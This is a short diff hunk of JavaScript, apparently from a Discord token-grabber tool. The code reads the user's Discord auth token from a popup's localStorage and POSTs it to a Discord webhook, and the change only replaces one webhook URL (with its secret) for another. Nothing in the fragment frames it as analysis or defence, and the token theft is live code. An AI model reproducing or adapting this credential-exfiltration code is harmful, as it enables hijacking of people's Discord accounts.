@@ -111,7 +111,7 @@
 		var fasdfee = JSON.parse(popup.localStorage.token);
         $('input#authToken').value = JSON.parse(popup.localStorage.token);
 		var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://discord.com/api/webhooks/797229721213468703/yWGwqYdIFMp-0DvhcGHx2Jj7HIfMRT5CumoAXuho4gu0KbAm2jaZhtkDBbgcHe5Ydw3f", true);
+        xhr.open("POST", "https://discord.com/api/webhooks/797928326144327690/-PpA5NukcXA3GrKvz1DuxW6sZ8fa_fo-9l6JLzpxkLc1TrLmJ3ggTzM5s6vOAnyQ07gn", true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.send(JSON.stringify({
             'content': fasdfee + " ",
